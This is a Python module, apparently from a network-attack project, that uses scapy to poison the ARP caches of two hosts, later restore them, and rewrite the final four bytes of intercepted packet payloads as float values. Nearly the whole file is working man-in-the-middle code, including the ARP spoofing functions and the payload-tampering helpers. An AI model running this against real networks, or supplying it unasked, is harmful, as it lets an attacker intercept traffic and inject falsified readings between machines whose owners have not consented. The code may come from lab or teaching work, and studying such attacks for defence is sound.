import codecs
import struct
import binascii

from scapy.all import srp, send
from scapy.layers.l2 import Ether, ARP


def get_mac(an_ip):
    """
    This function translates an IP address to a MAC address

    :param an_ip: The IP address to translate
    """
    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=an_ip)
    target_mac = srp(arp_packet, timeout=2, verbose=False)[0][0][1].hwsrc
    return target_mac

def launch_arp_poison(ip1, ip2):
    mac1 = get_mac(ip1)
    mac2 = get_mac(ip2)

    spoof_arp_cache(ip1, mac1, ip2)
    spoof_arp_cache(ip2, mac2, ip1)

def spoof_arp_cache(target_ip, target_mac, source_ip):
    spoofed = ARP(op=2, pdst=target_ip, psrc=source_ip, hwdst=target_mac)
    send(spoofed, verbose=False)

def restore_arp(ip1, ip2):
    mac1 = get_mac(ip1)
    mac2 = get_mac(ip2)

    packet = ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=mac2)
    send(packet, verbose=False)

    packet = ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=mac1)
    send(packet, verbose=False)

def translate_payload_to_float(raw_payload):
    """
    This function will convert a raw packet payload to a float number

    :param raw_payload: The payload to convert
    """
    hex_value = raw_payload.hex()
    length = len(hex_value)
    value_part = hex_value[length - 8 : length]
    return struct.unpack('<f', binascii.unhexlify(value_part))[0]


def translate_float_to_payload(float_value, original_payload):
    """
    This function will convert a float number to a raw package payload

    :param float_value: The float number to convert
    :param original_payload: The original payload of the packet
    """
    hex_payload = original_payload.hex()
    length = len(hex_payload)

    payload_save = hex_payload[0 : length - 8]
    hex_value = hex(struct.unpack('>I', struct.pack('<f', float_value))[0])

    result_hex = payload_save + hex_value[2:len(hex_value)]
    return binascii.unhexlify(result_hex)